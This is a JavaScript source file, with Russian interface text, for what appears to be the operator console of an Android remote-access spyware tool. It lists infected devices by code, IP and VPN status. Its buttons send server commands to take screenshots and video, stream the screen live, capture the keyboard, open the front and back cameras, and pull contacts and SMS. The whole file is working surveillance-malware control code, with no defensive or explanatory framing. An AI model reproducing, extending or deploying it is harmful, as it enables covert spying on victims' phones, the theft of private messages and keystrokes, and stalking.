window.renderControlPanel = function(code) {
    const d = window.getDevices()[code];
    if (!d) {
        console.error('❌ Устройство с кодом', code, 'не найдено');
        return;
    }
    let html = `<div class="card"><h2>Управление: ${d.name}</h2>
        <div class="detail-info">Код: ${d.code} | IP: ${d.ip} | VPN: ${d.vpn ? 'Да' : 'Нет'} | Статус: ${d.status}</div>
        <div class="control-panel">
            <button data-cmd="screenshot">Скриншот</button>
            <button data-cmd="video">Видео</button>
            <button data-cmd="stream">Трансляция</button>
            <button data-cmd="keyboard">Клавиатура</button>
            <button data-cmd="app">Открыть приложение</button>
            <button data-cmd="frontcam">Фронт. камера</button>
            <button data-cmd="backcam">Осн. камера</button>
            <button data-cmd="contacts">Контакты</button>
            <button data-cmd="sms">SMS</button>
        </div>
        <button id="backDevices">Назад</button>
        <div id="streamContainer" style="display:none; margin-top:20px; border:1px solid #ccc; padding:10px;">
            <h3>Трансляция</h3>
            <img id="streamImage" src="" style="width:100%; max-width:600px; background:#000;">
            <br>
            <button id="stopStreamBtn" style="background:red; color:#fff; border:none; padding:8px 16px; border-radius:4px;">Остановить</button>
        </div>
    </div>`;
    document.getElementById('content').innerHTML = html;
    document.querySelectorAll('.control-panel button').forEach(btn => {
        btn.addEventListener('click', function() {
            const cmd = this.dataset.cmd;
            console.log('🔘 Нажата кнопка, cmd =', cmd);
            if (cmd === 'stream') {
                document.getElementById('streamContainer').style.display = 'block';
                window.sendCommand(code, cmd, { action: 'start' });
                const ws = window.getWS();
                if (ws) {
                    if (window._streamListener) ws.removeEventListener('message', window._streamListener);
                    window._streamListener = function(e) {
                        try {
                            const data = JSON.parse(e.data);
                            if (data.type === 'stream_frame' && data.code === code) {
                                document.getElementById('streamImage').src = 'data:image/png;base64,' + data.image;
                            }
                        } catch(e) {}
                    };
                    ws.addEventListener('message', window._streamListener);
                }
                document.getElementById('stopStreamBtn').onclick = function() {
                    window.sendCommand(code, 'stream', { action: 'stop' });
                    document.getElementById('streamContainer').style.display = 'none';
                    document.getElementById('streamImage').src = '';
                    if (window._streamListener) {
                        ws.removeEventListener('message', window._streamListener);
                        window._streamListener = null;
                    }
                };
            } else if (cmd === 'app') {
                const pkg = prompt('Введите имя пакета приложения (например, com.android.chrome)');
                if (pkg) {
                    window.sendCommand(code, cmd, { package: pkg });
                }
            } else {
                window.sendCommand(code, cmd);
            }
        });
    });
    document.getElementById('backDevices').onclick = function() {
        window.showPage('devices');
    };
};

window.sendCommand = function(code, command, params) {
    console.log('📤 Отправка команды:', command, 'для кода:', code);
    fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code, command, params: params || {} })
    }).then(r => r.json()).then(data => {
        if (data.error) {
            console.error('❌ Ошибка от сервера:', data.error);
        } else {
            console.log('✅ Команда отправлена:', command);
        }
    }).catch(err => console.error('❌ Ошибка отправки:', err));
};
